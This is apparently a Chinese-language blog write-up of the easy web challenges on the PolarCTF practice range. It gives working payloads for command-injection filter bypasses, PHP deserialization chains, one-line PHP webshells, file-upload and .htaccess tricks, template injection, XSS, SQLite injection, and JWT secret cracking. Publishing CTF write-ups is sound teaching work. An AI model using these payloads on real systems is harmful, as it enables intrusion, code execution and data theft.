---
title: PolarCTF靶场Web方向简单难度WriteUp
typora-root-url: polarctf-web-easy
date: 2026-06-20 22:09:47
tags:
- web
- polarctf
- wp
- writeup
categories: 
- Writeup
- PolarCTF
---

# PolarCTF靶场Web方向简单难度

## swp

扫一下看到了index.php的交换文件

![image-20260625165520638](image-20260625165520638.png)

/.index.php.swp

```php
function jiuzhe($xdmtql){
    return preg_match('/sys.*nb/is',$xdmtql); 
} 
$xdmtql=@$_POST['xdmtql']; 
if(!is_array($xdmtql)){ 
    if(!jiuzhe($xdmtql))
    {
        if(strpos($xdmtql,'sys nb')!==false){
            echo 'flag{*******}'; 
        }else{
            echo 'true .swp file?'; 
        } 
    }else{
        echo 'nijilenijile'; 
    }
}
```

注意到这里使用正则匹配字符串，并且POST方法传递，我们可以传递很长的数据

这里利用到`perg_match`的 PCRE回溯次数限制，我们在数据后面追加100万的垃圾数据

```python
import requests
r = requests.post('http://634c09b7-6f40-4815-a6cd-1c4b2be1a261.www.polarctf.com:8090/', data={'xdmtql':'sys nb' + 'a' * 1000000});
print(r.text);
```

![image-20260625170732820](image-20260625170732820.png)

## 简单rce

分析代码

```php
<?php
/*

PolarD&N CTF

*/
highlight_file(__FILE__);
function no($txt){
	if(!preg_match("/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i", $txt)){
		return $txt;
	}
	else{
		die("what's up");
	}
}

$yyds=($_POST['yyds']);

if(isset($_GET['sys']) && $yyds=='666'){
	eval(no($_GET['sys']));
}
else {
	echo "nonono";
}
?> 
```

eval执行php代码，sys参数传入需要执行的php代码。yyds用GET方法固定传入666

这里对sys参数传入的代码进行了过滤，但是没有过滤`echo`和`file_get_contents`

过滤了空格，测试发现可以用换行符`%0D`替代，构造参数如下：

`?sys=echo%0dfile_get_contents("/flag");`

![image-20260620221808540](image-20260620221808540.png)

## 蜜雪冰城吉警店

这题的关键在js加密，用前辈写好的v6解密器解密即可

https://gitee.com/daixiaomao/JsjiamiV6-Decryptor

![image-20260620224405607](image-20260620224405607.png)

解密后：

![image-20260620223240529](image-20260620223240529.png)

## 召唤神龙

![image-20260621134936549](image-20260621134936549.png)

召唤神龙并不能获取flag，查看页面源代码

main.js中发现了`jsfuck`

![image-20260621135006601](image-20260621135006601.png)

解密得到flag

![image-20260621135036779](image-20260621135036779.png)

## seek flag

![image-20260625171257742](image-20260625171257742.png)

响应头有一部分flag

```
flag2 3ca8737a70f029d
```

我们还被设置了Cookie，把0改成1试试

![image-20260625171408231](image-20260625171408231.png)

```
flag1:flag{7ac5b
```

扫目录

![image-20260625171147762](image-20260625171147762.png)

发现了`robots.txt`

![image-20260625171202556](image-20260625171202556.png)

```
c0ad71dadd11}
```

拼一下`flag{7ac5b3ca8737a70f029dc0ad71dadd11}`

## jwt

有注册和登录页面，注册时使用admin提示已被占用，随便注册一个别的名字

发现只有主页的功能，抓包拦截到jwt令牌

![image-20260621143110690](image-20260621143110690.png)

payload中包含了用户名

![image-20260621143133840](image-20260621143133840.png)

尝试了不签名、修改算法为none等均无效，尝试暴破密钥

`hashcat -d 2 -m 16500 -a 3 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InNiIn0.OL5zHLoOkTC3_5AeVkxGWXpH-a9ugISneiXdGZAPvD4  masks\rockyou-1-60.hcmask`

hashcat跑出密钥为`SYSA`

![image-20260621143045728](image-20260621143045728.png)

生成一个用户名为admin的JWT

![image-20260621143515866](image-20260621143515866.png)

修改请求后发包，得到flag

![image-20260621143544547](image-20260621143544547.png)

## login

给了一个登录页面，源码中放了疑似账密的注释

![image-20260626165720630](image-20260626165720630.png)

登录后提示登录成功，尝试遍历学号

![image-20260626165742555](image-20260626165742555.png)

![image-20260626165938413](image-20260626165938413.png)

遍历到20200111是最后一个字符

`flag{dlcg}`

## iphone

![image-20260621143822861](image-20260621143822861.png)

提示需要用苹果设备访问，打开开发人员工具，使用设备模拟功能，设置IPhone的UA头即可

![image-20260621143928941](image-20260621143928941.png)

## 浮生日记

XSS

![image-20260626170115729](image-20260626170115729.png)

标题中的字符实体化了，输入框中显示的内容被替换了，闭合引号后双写试试

`"><scscriptript>alert(1)</scrscriptipt>`

![image-20260626170244017](image-20260626170244017.png)

随后跳转到flag页面

## $$

题目给了源代码，过滤了很多内容

![image-20260621144249716](image-20260621144249716.png)

过滤了flag、括号、下划线、分号等，不能闭合括号执行其他函数，只能利用`var_dump`

但是PHP存在一个超级全局变量`$GLOBALS`，输出它的内容就可以获取到所有全局变量，其中会包含flag.php的flag内容。

![image-20260621144432126](image-20260621144432126.png)

## 爆破

页面源码如下：

```php
<?php
error_reporting(0);

if(isset($_GET['pass'])){
    $pass = md5($_GET['pass']);
    if(substr($pass, 1,1)===substr($pass, 14,1) && substr($pass, 14,1) ===substr($pass, 17,1)){
        if((intval(substr($pass, 1,1))+intval(substr($pass, 14,1))+substr($pass, 17,1))/substr($pass, 1,1)===intval(substr($pass, 31,1))){
            include('flag.php');
            echo $flag;
        }
    }
}else{
    highlight_file(__FILE__);

}
?>
```

要求输入的字符串md5后，第2个字符和第15个字符和第18个字符相等。要求第2个字符+第15个字符+第18个字符的和除以第一个字符的值为第32个字符。

尝试暴破数字，从0到9999

![image-20260626170639661](image-20260626170639661.png)

## XFF

![image-20260626171023669](image-20260626171023669.png)

设置XFF头即可

## rce1

![image-20260621151139555](image-20260621151139555.png)

尝试管道符拼接一下，输出当前目录的文件

接下来用cat输出，但是这里过滤了空格

绕过空格的方式有

- `${IFS}`
- `%09`
- `{cat,flag.php}`

这里可以用前两个

![image-20260621151522193](image-20260621151522193.png)

![image-20260621151508767](image-20260621151508767.png)

flag被注释掉了，需要查看源代码才可以看到

（这样在已知flag文件的情况下直接访问也可以看到）

## GET-POST

![image-20260626171132780](image-20260626171132780.png)

会传参即可

## 被黑掉的站

页面提示站里还有马，可以扫一下

![image-20260626171334103](image-20260626171334103.png)

发现了`shell.php`

![image-20260626171636852](image-20260626171636852.png)

需要一个访问密码，注意到刚刚扫描结果中还有一个index.php的备份文件，访问一下发现一堆看起来像密码的东西

![image-20260626171708016](image-20260626171708016.png)

作为字典用`Intruder`跑一下

![image-20260626171730419](image-20260626171730419.png)

## 签到题

![image-20260621153349889](image-20260621153349889.png)

抓包修改Cookie值

![image-20260621153339352](image-20260621153339352.png)

发包后，返回

![image-20260621153426432](image-20260621153426432.png)

解码为：`./data/index.php`，拼接到网址中

![image-20260621153459495](image-20260621153459495.png)

这里给了文件包含，简单的路径穿越过滤，并且要求包含的文件`.php`结尾

双写绕过过滤，并且祈祷flag以.php结尾

![image-20260621163605293](image-20260621163605293.png)

![image-20260621163638298](image-20260621163638298.png)

## 签到

页面的按钮是禁止点击的，开发人员工具中去除它的`disabled`属性，随便提交点东西

![image-20260621162928701](image-20260621162928701.png)

修改一下输入框的限制长度，然后输入后提交

![image-20260621163044861](image-20260621163044861.png)

![image-20260621163110952](image-20260621163110952.png)

得到flag

## session文件包含

![image-20260626171854374](image-20260626171854374.png)

注意到这里有一个传参，大概是文件包含的传参

尝试包含常见的flag文件无果，也许我们应该试着包含Session

Linux常见的session路径：

- /var/lib/php/sess_PHPSESSID
- /var/lib/php/sess_PHPSESSID
- /tmp/sess_PHPSESSID
- /tmp/sessions/sess_PHPSESSID

测试包含：

![image-20260626172301659](image-20260626172301659.png)

发现成功包含，于是在输入用户名的时候可以写一个简单的马上去
`<?php eval($_GET[1]);?>`

作为用户名后

![image-20260626172609350](image-20260626172609350.png)

成功得到flag

## Don't touch me

跳来跳去的，意义不大

![image-20260621164011921](image-20260621164011921.png)

![image-20260621164020592](image-20260621164020592.png)

![image-20260621164028640](image-20260621164028640.png)

![image-20260621164033888](image-20260621164033888.png)

## robots

![image-20260621164110160](image-20260621164110160.png)

## php very nice

一道简单的反序列化

```PHP
<?php
 highlight_file(__FILE__);
 class Example
 {
     public $sys='Can you find the leak?';
     function __destruct(){
         eval($this->sys);
     }
 }
 unserialize($_GET['a']);	
```

先观察目录结构：

```php
$a = new Example();
$a->sys = 'echo system("ls");';
echo serialize($a);
```

![image-20260621165632965](image-20260621165632965.png)

尝试`cat`输出`flag.php`

![image-20260621165727752](image-20260621165727752.png)

## ezupload

随便上传一个提示只能传GIF，传GIF后尝试修改后缀和文件内容

发现仅仅校验了MIME，直接上传木马

![image-20260621171302010](image-20260621171302010.png)

读取上一层路径

![image-20260621171326651](image-20260621171326651.png)

cat得到flag

![image-20260621171336946](image-20260621171336946.png)

## cookie欺骗

拦截请求，发现Cookie中包含用户字段

![image-20260621172018147](image-20260621172018147.png)

改成admin即可拿到flag

## upload

![image-20260621173404060](image-20260621173404060.png)

测试发现replace过滤了php后缀名字，双写绕过，直接写入即可

![image-20260621173451563](image-20260621173451563.png)

## 干正则

题目给了源码：

```php
<?php
error_reporting(0);
if (empty($_GET['id'])) {
    show_source(__FILE__);
    die();
} else {
    include 'flag.php';
    $a = "www.baidu.com";
    $result = "";
    $id = $_GET['id'];
    @parse_str($id);
    echo $a[0];
    if ($a[0] == 'www.polarctf.com') {
        $ip = $_GET['cmd'];
        if (preg_match('/flag\.php/', $ip)) {
            die("don't show flag!!!");
        }

        $result .= shell_exec('ping -c 2 ' . $a[0] . $ip);
        if ($result) {
            echo "<pre>{$result}</pre>";
        }
    } else {
        exit('其实很简单！');
    }
}
```

这里用了`parse_str`函数，这个在8.0之前可以覆盖变量，题目利用了这一点使得可以进入命令执行分支

构造：`?id=a[0]=www.polarctf.com`

然后传入cmd参数：`&cmd=|ls`

看到了返回中的`flag.php`

![image-20260621174843817](image-20260621174843817.png)

由于正则过滤了全文件名，可以用grep命令在当前目录下查找所有文件中包含flag的行

`&cmd=|grep "flag" *`

![image-20260621175419966](image-20260621175419966.png)

## cool

```php
<?php
if(isset($_GET['a'])){
    $a = $_GET['a'];
    if(is_numeric($a)){
        echo "no";
    }
    if(!preg_match("/flag|system|php/i", $a)){
        eval($a);
    }
}else{
    highlight_file(__FILE__);
}
?>
```

简单过滤了`system`和`flag`，用`passthru`执行ls看下

`?a=passthru("ls");`

![image-20260621182426579](image-20260621182426579.png)

直接访问即可

## uploader

给了源码，无过滤的文件上传，构造一个上传数据包

![image-20260621185556864](image-20260621185556864.png)

上传后在根目录发现flag

![image-20260621185652277](image-20260621185652277.png)

## 覆盖

和干正则怎么重复了

复用一下

![image-20260621224923083](image-20260621224923083.png)

## PHP反序列化初试

题目源码如下：

```php
<?php
class Easy{
    public $name;
    public function __wakeup()
    {
        echo $this->name;
    }
}
class Evil{
    public $evil;
    private $env;
    public function __toString()
    {
        $this->env=shell_exec($this->evil);
        return $this->env;
    }
}

if(isset($_GET['easy'])){
    unserialize($_GET['easy']);
}else{
    highlight_file(__FILE__);
}
```

外层创建Easy，name属性为Evil对象，由于输出了name，执行了toString，也执行了`shell_exec`

构造：

```php
$easy = new Easy();
$evil = new Evil();
$evil->evil = "cat f1@g.php";
$easy->name = $evil;
echo serialize($easy);
```

生成：`O:4:"Easy":1:{s:4:"name";O:4:"Evil":2:{s:4:"evil";s:12:"cat f1@g.php";s:9:"Evilenv";N;}}`

序列化文本存在小问题，需要手动修改字符串长度，改为`O:4:"Easy":1:{s:4:"name";O:4:"Evil":2:{s:4:"evil";s:12:"cat f1@g.php";s:7:"Evilenv";N;}}`

![image-20260626173403698](image-20260626173403698.png)

## 机器人

根据首页和题目提示，观察robots.txt文件

![image-20260626173609734](image-20260626173609734.png)

发现了一半的flag内容，以及另一个目录，访问进去是403，来扫描一下

![image-20260626173713845](image-20260626173713845.png)

发现了flag.php

![image-20260626173722590](image-20260626173722590.png)

`flag{4749ea1ea481a5d56685442c8516b61c}`

## 扫扫看

按照提示，扫一下

![image-20260626173844592](image-20260626173844592.png)

发现flag

![image-20260626173834330](image-20260626173834330.png)

## debudao

源码里放了个假的

![image-20260626174059440](image-20260626174059440.png)

响应头中设置了Cookie

![image-20260626174110399](image-20260626174110399.png)

## 审计

要求输入是数字、输入的md5值以0e开头，随后都为数字，在网上找到了满足条件的字符串

```
0e215962017
```

这个值会被解析为科学计数法，转为数字应该为0，底数为0

![image-20260621225919414](image-20260621225919414.png)

## upload1

似曾相识的题，只有前端校验

![image-20260622221121226](image-20260622221121226.png)

直接传马即可

flag在`/flag.txt`

## rapyiquan

`REQUEST_URI`的绕过：浏览器发送URL编码后的下划线即可绕过

```php
<?php
echo "URI为：" . $_SERVER['REQUEST_URI'] . '<br>';
echo "输入参数a的值为：" . $_GET['a'] . '<br>';
```

以上代码输出结果如下：

![image-20260623173030865](image-20260623173030865.png)

随后是正则

![image-20260623174148799](image-20260623174148799.png)

由于PHP字符串中表示单个反斜线需要写成`\\`，而在正则表达式中，表示匹配反斜线需要写成`\\`（两个反斜线），因此，在PHP中使用正则表达式匹配反斜线需要写成`\\\\`

而这里写成了`\\|\\\\`，意味着匹配的实际上是`|\`，而没有匹配到反斜线

因此可以在执行命令中使用`\`绕过前面的命令匹配

`?c%5Fmd=l\s /` 读取到根目录下内容

`?c%5Fmd=gre\p fla /fla\g.php`读取到flag

![image-20260623175408159](image-20260623175408159.png)

## bllbl_ser1

反序列化：

```php
<?php
class bllbl
{
    public $qiang;//我的强
    function  __destruct(){
        $this->bllliang();
    }
    function bllliang(){
        $this->qiang->close();
    }
}
class bllnbnl{
    public $er;//我的儿
    function close(){
        eval($this->er);
    }
}
```

```php
$bllbl = new bllbl();
$bllbl->qiang = new bllnbnl();
$bllbl->qiang->er = 'echo system("cat /flag");';
echo serialize($bllbl);
```

`O:5:"bllbl":1:{s:5:"qiang";O:7:"bllnbnl":1:{s:2:"er";s:25:"echo system("cat /flag");";}}`

## 1ncIud3

给了包含的提示，扫路径发现有404、about等，包含一个发现后缀自动添加`.php`

尝试伪协议无果

尝试路径穿越

![image-20260623183603946](image-20260623183603946.png)

![image-20260623183614737](image-20260623183614737.png)

纯蒙

## 投喂

![image-20260623183712299](image-20260623183712299.png)

页面提示上讲是一个反序列化，用POST发送序列化后的数据，类名是`User`，其中包含两个属性，`username`和`is_admin`

```php
<?php
class User{
    public $username;
    public $is_admin;
}

$user = new User();
$user->username = "qianxia";
$user->is_admin = true;
$a = serialize($user);
echo $a;
```

用POST传`data=O:4:"User":2:{s:8:"username";s:7:"qianxia";s:8:"is_admin";b:1;}`

![image-20260623184314686](image-20260623184314686.png)

## 狗黑子的RCE

题目源码如下：

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
header('content-type:text/html;charset=utf-8');


    $gouheizi1=$_GET['gouheizi1'];
    $gouheizi2=$_POST['gouheizi2'];
    $gouheizi2=str_replace('gouheizi', '', $gouheizi2);

    if (preg_match("/ls|dir|flag|type|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $gouheizi1)) {
        echo("badly!");
        exit;
    } 
    if($gouheizi2==="gouheizi"){
        system($gouheizi1);
    }else{
        echo "gouheizi!";
    }
?>
```

一次替换，双写绕过`gouheizi2=gouheigouheizizi`

正则和`rapyiquan`一样，存在过滤缺陷，没有成功过滤反斜线，使用如下读取到flag

`?gouheizi1=c\at /f\lag.php`

![image-20260623184713728](image-20260623184713728.png)

## button

观察js

![image-20260626183504326](image-20260626183504326.png)

访问后观察源代码

![image-20260626183518501](image-20260626183518501.png)

## 井字棋

观察到前端逻辑

![image-20260623185026939](image-20260623185026939.png)

前端判断输赢后发给后端，直接修改变量

![image-20260623185132242](image-20260623185132242.png)

## 简单的导航站

先注册一个账号，发现一个查看用户列表的链接

源码如下：

![image-20260623193123930](image-20260623193123930.png)

MD5比较，科学计数法或者数组绕过，参考：https://www.cnblogs.com/AikN/p/15757813.html

这里用数组绕过，传参：`?user1[]=a&user2[]=b`

![image-20260623193215356](image-20260623193215356.png)

给了一堆用户名，尝试用户名密码交叉暴破无果。

![image-20260623193247408](image-20260623193247408.png)

用Admin1234!作为密码进行暴破

![image-20260623193328518](image-20260623193328518.png)

暴破出来用户名是`P0la2adm1n`

随后用这个用户名和密码登录，进入上传文件页面

毫无验证，可以直接传马

扫一下或者按照经验可以发现上传路径是`/uploads/`

![image-20260623194045396](image-20260623194045396.png)

flag？？？是个目录

![image-20260623194211416](image-20260623194211416.png)

![image-20260623194233457](image-20260623194233457.png)

给了一堆flag，这里可以在flag验证那个页面暴破，或者既然有了shell可以直接读取flag验证php的逻辑

![image-20260623194333273](image-20260623194333273.png)

## 来个弹窗

`<script>alert(1)</script>`没反应，像测一下过滤了什么用了`<scrip1t>alert(1)</script>`，直接判定成功了

![img](/hidden_image.jpg)

## background

主页面只有一个按钮，没反应，观察控制台有报错，跟踪到js

![image-20260623200002181](image-20260623200002181.png)

这里缺少括号，用DevTools的本地覆盖，添加括号后刷新

![image-20260623200117711](image-20260623200117711.png)

点一下换一张壁纸

观察网络请求中

![image-20260623200141176](image-20260623200141176.png)

包含echo，怀疑命令执行

![image-20260623200316197](image-20260623200316197.png)

## 0e事件

根据题目名称以及以前做过的题目推测套路

php的弱类型特性，导致0e后全部数字的字符串会当做科学计数法解析

有可能让我们输入一个符合这种特性的数字，但并不成功

另一种是md5后，产生的值是这种字符串，参见<a href="#title-33" target="_self">审计</a>

用`0e215962017`测试，提示成功

![image-20260625132807131](image-20260625132807131.png)

## 简单的链子

反序列化题目，

```php
<?php
class A {
    public $cmd;
    function __destruct() {
        if (isset($this->cmd)) {
            system($this->cmd);
        }
    }
}

if (isset($_GET['data'])) {
    $data = $_GET['data'];
    @unserialize($data);
} else {
    highlight_file(__FILE__);
}
```

很明确，新建一个A对象，使其cmd值为将要执行命令即可

```php
$a = new A();
$a->cmd = "cat /flag";
echo serialize($a);
```

序列化字符串如下：`O:1:"A":1:{s:3:"cmd";s:9:"cat /flag";}`

![image-20260625133257807](image-20260625133257807.png)

## ghost_render

![image-20260626184103942](image-20260626184103942.png)

存在模板注入

输入`{{"".__class__.__mro__[1].__subclasses__()[300].__init__.__globals__["os"]["popen"]("cat /var/secret_flag").read()}}`得到flag

![image-20260626184531254](image-20260626184531254.png)

## rce命令执行系统

命令过滤了ls、base64等，有文件操作也不能通过

![image-20260626185121440](image-20260626185121440.png)

![image-20260626185153045](image-20260626185153045.png)

扫到这样的文件，把相应字符替换一下

![image-20260626185218757](image-20260626185218757.png)

意义不明，搜了一下

![image-20260626185115236](image-20260626185115236.png)

不知道怎么联系到环境变量的

## 命运石之门

一个登录页面，有个验证码加载不出来

<img src="/image-20260625134156740.png" alt="image-20260625134156740" style="zoom:50%;" />

<del>（或者加载出来了）</del>

![image-20260625134258266](image-20260625134258266.png)

页面源代码藏了一段base64编码

![image-20260625134321438](image-20260625134321438.png)

大概意味着验证码并不重要。

初次用burp自带的密码字典爆了一下没有成功，扫目录看看

![image-20260625134121845](image-20260625134121845.png)

发现了一堆密码，约1w个，用Burp重新跑一下

![image-20260625134459234](image-20260625134459234.png)

第6990个返回长度不同

![image-20260625134522369](image-20260625134522369.png)

报了验证码错误

继续暴破验证码，按4位暴破：

![image-20260625134632965](image-20260625134632965.png)

第一个就是

![image-20260625134653830](image-20260625134653830.png)

跳转到了`65ba841e01d6db7733e90a5b7f9e6f80.php`

这里需要输入一个密码，并且还有图像验证码

图像验证码的内容类别放在了请求包里，可以直接暴破

![image-20260625135256493](image-20260625135256493.png)

用刚刚得到的密码字典来暴破

![image-20260625135233495](image-20260625135233495.png)

密码为`huan9le1Sam0`，跳转到了`74b87337454200d4d33f80c4663dc5e5.php`

拿到flag

![image-20260625135341778](image-20260625135341778.png)

## 俄罗斯方块

打通了和获得了十分都没有什么用，也没有观察到任何网络请求

于是阅读前端代码

![image-20260625140436979](image-20260625140436979.png)

注意到这里是设置姓名时的调用

输入的名字中包含`<script>`就会触发php的访问，直接访问也可以看到flag

![image-20260625140549501](image-20260625140549501.png)

## 代码审计easy

![image-20260625141632975](image-20260625141632975.png)

存在路径穿越

测了根目录下没有flag，试试上级

![image-20260625141649556](image-20260625141649556.png)

## VIP

![image-20260625141841590](image-20260625141841590.png)

POST传了个参，改成yes试试

![image-20260625141859274](image-20260625141859274.png)

## white

做了命令的白名单过滤，限制了*等通配符，不可以添加命令白名单

用ls可以看到flag在根目录的`flag.php`

用base64，没有过滤反斜线，绕过对`flag`字符串的匹配

![image-20260625142315808](image-20260625142315808.png)

![image-20260625142353627](image-20260625142353627.png)

## 来个弹窗2.0

测试发现过滤了`<script>`标签，其他的可以正常使用

那么，用`<img src=x onerror="alert(1)">`进行弹窗

跳转后，给了一个页面

![image-20260625143656191](image-20260625143656191.png)

![image-20260625143940300](image-20260625143940300.png)

搜到了中文译名应该是本萨姆，md5为0735987a1391de965a0717fc7c4f6a1a

## help

前端验证，多种方式绕过

![image-20260625144413148](image-20260625144413148.png)

![image-20260625144424685](image-20260625144424685.png)

![image-20260625144402505](image-20260625144402505.png)

![image-20260625144355749](image-20260625144355749.png)

## cookie欺骗2.0

登录后观察Cookie

![image-20260625144603148](image-20260625144603148.png)

一个auth和一个user，如果仅仅修改user会提示无效的cookie

发现auth和user同有一个1，推测rot13

![image-20260625144642300](image-20260625144642300.png)

将`user`改为`admin`，`auth`改成`nqzva`

![image-20260625144711082](image-20260625144711082.png)

## uii

不知道这是什么咖啡，但是验证写前端里了

![image-20260625145019826](image-20260625145019826.png)

给了源码，应该是传入uii参数双重URL编码，但是直接提交也过了，源码如下：

![image-20260625145432339](image-20260625145432339.png)

获得flag：

![image-20260625145440728](image-20260625145440728.png)

这里比较奇怪，自行复制了源码下来测试是预期行为

![image-20260625145527048](image-20260625145527048.png)

![image-20260625145554715](image-20260625145554715.png)

而且该题的flag格式并不标准

## The Gift

![image-20260625150721247](image-20260625150721247.png)

注意此处，将所有传入的参数都作为变量，意味着我们可以覆盖它的config变量

传参`config[isAdmin]=true`即可

![image-20260625150805752](image-20260625150805752.png)

另外，这道题用`is_array`判断config变量，和强类型比较字符串型的`true`，明确表明这是一道CTF题目

## 并发上传

上传没有回显，只有200

推测上传路径在`/upload/xxx`，可以传一个文件验证一下

发现上传php后，对应服务器路径返回404，而图片文件正常

根据题目名，推测是条件竞争

`<?php fputs(fopen('a.php','w'),'<?php eval($_REQUEST[1]);?>');?>`

用Burp的Null payload持续跑

![image-20260625151923631](image-20260625151923631.png)

一边上传木马

<img src="/image-20260625151941263.png" alt="image-20260625151941263" style="zoom:50%;" />

一边访问木马

<img src="/image-20260625151948629.png" alt="image-20260625151948629" style="zoom:50%;" />

在许多的404和500中等到了一个200，访问`a.php`

![image-20260625152042976](image-20260625152042976.png)

找到flag

## sql_search

SQL注入题，一个永真一个永假看下回显：

![image-20260625152250326](image-20260625152250326.png)

![image-20260625152257192](image-20260625152257192.png)

用ORDER BY判断一下字段数

![image-20260625152426177](image-20260625152426177.png)

测到4时发现不回显内容，判断只有3列数据

测试发现是SQLLite：

![image-20260625160131046](image-20260625160131046.png)

参考https://xz.aliyun.com/news/8220

查所有表`'union select 1,2, sql from sqlite_master where type='table'--`

![image-20260625160237754](image-20260625160237754.png)

![image-20260625160357770](image-20260625160357770.png)

## 狗黑子的股市之路

首页一个输入数字返回数字的东西，没发现什么

扫一下路径，发现了`flag.php`，直接点击认证，发现发了个数据包，存在`check`参数，直接修改为yes

![image-20260625161036232](image-20260625161036232.png)

返回了flag

![image-20260625161104486](image-20260625161104486.png)

## 身份权限校验系统

纯靠猜，不可解释

![image-20260625161704994](image-20260625161704994.png)

## uploadfile

经测试，上传内容中过滤了`<?`字符，和`php`后缀

但是由于Apache服务器，并且可以上传`.htaccess`

先上传`.htaccess`

```.htaccess
AddType application/x-httpd-php .png
```

使其解析.png为php

然后用不包含`<?`的方式执行php代码

如：

```php
<script language="php">
@eval($_GET['cmd']);
</script>
```

![image-20260625162710349](image-20260625162710349.png)

可以传，但是不能成功解析，因为这个方法需要PHP<7，但题目中是7.0.9

![image-20260625164055414](image-20260625164055414.png)

继续利用`.htaccess`，其中`auto_prepend_file`指令，可以让PHP文件执行之前自动包含目标文件，但目标文件开头必须要有标签，不然会被作为纯文本

但该指令也支持伪协议，我们可以上传base64编码后的php代码，使用该指令解码即可

生成base64编码的木马：`PD9waHAgZXZhbCgkX0dFVFsxXSk7Pz4=`

上传为`b.png`

然后上传`.htaccess`，内容为

```.htaccess
AddType application/x-httpd-php .png
php_value auto_prepend_file php://filter/convert.base64-decode/resource=b.png
```

随后访问`/upload/b.png`，会在它自身的头部追加php代码

![image-20260625164649889](image-20260625164649889.png)

![image-20260625164704163](image-20260625164704163.png)

## 偷吃蟠桃

分析前端代码，总共两关，第一关目标30分，第二关1000000分

![image-20260625165210926](image-20260625165210926.png)

另一个提交分数的函数，包括分数、当前关卡及是否通过

![image-20260625165220503](image-20260625165220503.png)

直接在控制台调用这个函数，分数超过1000000，关卡写2，passed写1

`submitResult(10000000000, 2, 1);`

![image-20260625165341695](image-20260625165341695.png)
